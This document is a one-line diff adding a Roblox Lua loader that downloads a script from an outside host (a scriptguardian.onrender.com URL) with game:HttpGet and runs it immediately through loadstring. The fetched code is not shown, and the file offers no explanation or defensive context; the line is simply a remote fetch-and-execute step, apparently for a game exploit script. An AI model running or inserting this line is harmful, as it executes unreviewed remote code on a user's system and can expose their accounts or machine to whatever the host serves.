@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://scriptguardian.onrender.com/scriptguardian/files/scripts/loaders/3d5548ba31634b708a6e3f97fed74646"))()
